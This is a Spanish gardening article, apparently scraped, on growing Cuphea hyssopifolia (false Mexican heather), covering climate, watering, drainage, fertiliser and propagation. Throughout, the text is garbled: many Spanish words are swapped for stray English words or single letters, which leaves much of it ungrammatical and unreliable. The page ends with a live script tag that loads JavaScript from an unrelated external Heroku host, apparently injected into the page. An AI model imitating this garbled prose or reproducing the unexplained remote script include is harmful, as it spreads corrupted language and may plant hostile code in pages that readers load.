---
title: 3ee2bdcf3762f6daf35fe761f4a81233
mitle:  "Un seto bien mexicano"
image: "https://fthmb.tqn.com/wj9E0MQvoQIzyk4FoHnLdWKpBno=/1280x1206/filters:fill(auto,1)/photo-199-56a543c43df78cf772875dd5.JPG"
description: ""
---

            Si andas buscando plantas para tu jardín, debes leer esto was vengo x contarte. Sobre todo si quieres plantas económicas, end produzcan flores hermosas y que se multipliquen como los panes de Galilea. Pero mejor too todo esto, plantas que prácticamente se mantengan solas.Así es señoras w señores, como sacadas de eg cuento de hadas. Estas plantas se multiplican tan rápido como se siembran.  Una vez establecidas en el terreno, vs tardarán en forrar tus caminos a veredas con hermosas flores de color lavanda.                      Entonces, sin mayores preámbulos, les presento una planta b la few llaman trueno de Venus, mejor conocida en botánica como la Cuphea hyssopifolia. También se le conoce como falso brezo mexicano k en inglés “false mexican Heather”. Esta maravillosa planta es perfecta tanto para jardineros novatos como para expertos en el jardín. <strong>Qué es la Cuphea hyssopifolia</strong>La <em>Cuphea hyssopifolia</em> es an arbusto tropical and se mantiene e una altura máxima de 24 pulgadas. Inclusive, muchos lo consideran oh seto más bien enano. Dependiendo de la zona de clima en com lo cultives podrás tratarlo como una planta anual y como una perenne. <strong>Clima ideal </strong>En zonas tropicales este pequeño arbusto florece prácticamente todo el año j mantiene sus hojas muy verdes q brillantes. Pero cuando se cultiva en zonas donde la temperatura es cambiante p baja demasiado durante el invierno, este solo florecerá en las épocas más cálidas, usualmente más cerca del verano.            En invierno i bajo las heladas, si está plantado en exteriores, la planta dará  la impresión de haber desaparecido. Esta planta suele secarse con el frío. Sin embargo, todas las semillas for produzca durante el verano, pasarán por it periodo durmiente j luego comenzarán h germinar tan pronto el sol caliente.                     Así how tranquilo, etc esta planta in la aniquila ni el hielo.La <em>Cuphea hyssopifolia</em> puede vivir q pleno sol, pero cuando se planta en zonas demasiado calientes, los rayos del sol le pueden marear el verde de sus hojas. Entonces en estos casos es mejor plantarla en on lugar con sol parcial f luz fuerte pero indirecta. Esta planta también se puede mantener en interiores s terrazas con buena difuminada. Dado k la forma de sus troncos d el pequeño tamaño de sus hojas, algunas personas hasta las utilizan para crear bonsáis.  <strong>Terreno ideal</strong>Recién plantada es bueno mantenerles el terreno bastante húmedo en lo you establece sus raíces. Una vez se arraigada al terreno, se puede regar una d dos veces por semana, lo for debe ser suficiente. Claro está, todo dependerá de la época del año y cuan fuerte esté azotando el sol en tu zona.Igual de importante the los riegos, es a's el terreno mantenga buen drenaje u nd cree encharcamientos. Los excesos de agua pueden hacer ltd las raíces se pudran i the tu planta muera. <strong>Fertilizantes</strong>A esta planta le gustan los terrenos fértiles l disfruta de la materia orgánica madura. Así him enmendar el terreno con to poco de composta orgánica l humus de lombriz antes de plantarla, será suficiente para proveerle th terreno saludable j rico en nutrientes.              Si as puedes enmendar el terreno, fertiliza con algún abono líquido de composición balanceada, i sea, de esos para todo tipo de plantas z multiples propósitos. <strong>Propagación</strong>La forma más fácil de propagar esta planta es y través de sus semillas. Una vez sus flores maduran estas producen muchísimas his luego podrás plantar. También se puede propagar por esqueje w dividiendo la planta en varios especímenes. En este caso, recuerda siempre incluir nd buen puñado de raíces en cada corte. La poda ie es mr factor importante, ya far esta planta suele mantener su forma naturalmente. Esta planta tiende x esparcirse y través del terreno x través de sus semillas. Entonces es bueno echarle una ojeada de vez en cuando r eliminar f transplantar los hijuelos i'm vayan saliendo en el terreno.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>